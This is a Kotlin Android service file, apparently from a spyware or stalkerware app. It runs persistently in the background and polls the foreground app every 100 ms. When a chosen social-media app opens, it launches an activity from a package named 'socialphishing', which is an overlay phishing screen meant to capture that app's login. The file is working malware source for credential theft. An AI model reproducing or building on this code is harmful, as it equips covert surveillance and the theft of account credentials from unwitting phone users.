package com.dtz.netservice.services.social

import android.content.Intent
import com.dtz.netservice.services.base.BaseService
import com.dtz.netservice.ui.activities.socialphishing.SocialActivityM
import com.dtz.netservice.utils.ConstFun.getPackageCheckSocial
import com.dtz.netservice.utils.checkForegroundApp.CheckApp
import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.start
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class MonitorService : BaseService() {

    private lateinit var appChecker: CheckApp

    @Inject
    lateinit var interactor: InteractorMonitorService

    override fun onCreate() {
        super.onCreate()
        getComponent()!!.inject(this)
        startAppChecker()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        if (!hasUsageStatsPermission()) interactor.setPermission(false)
        else interactor.setPermission(true)

        return START_STICKY
    }

    override fun onDestroy() {
        appChecker.stop()
        super.onDestroy()
        interactor.gerSocialStatus()
    }

    private fun startAppChecker() {
        appChecker = CheckApp(this) { app ->
            if (app == getPackageCheckSocial()) { startApp() }
        }.setTimeout(100).start()
    }

    private fun startApp() {
        val intent = IntentFor<SocialActivityM>(this)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

}